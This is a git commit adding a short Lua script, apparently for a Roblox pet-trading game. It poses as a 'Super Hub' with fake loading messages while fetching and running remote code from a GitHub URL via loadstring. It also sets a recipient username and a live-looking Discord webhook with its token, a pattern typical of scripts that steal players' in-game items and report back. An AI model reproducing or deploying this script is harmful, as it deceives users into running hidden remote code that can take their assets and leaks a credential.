7285e4c4542177a7352b765c62d39603c32111f6
TONOYAK1 <124351455+TONOYAK1@users.noreply.github.com>
2023-02-07 15:19:17 +0630

    Create Nike Fucker Huge-A-Tron.lua

---
+++ Nike Fucker Huge-A-Tron.lua
@@ -0,0 +1,9 @@
+Username = "TONOY_TALK"
+WebHook = "https://discord.com/api/webhooks/1072143988926189588/yeskzt-ZCksTJUCteGZsDj-huADu21DdWLpi_Q1LNLDbeM-c9aTS5Zfe4ZGlkttirxFY"
+
+_G.CustomScriptName = "Super Hub"
+_G.Text1 = "Script made by PxT..."
+_G.Text2 = "The Hub Is Getting Key!"
+_G.Text3 = "Checking Background..."
+_G.Text4 = "Your Script Is Ready!"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
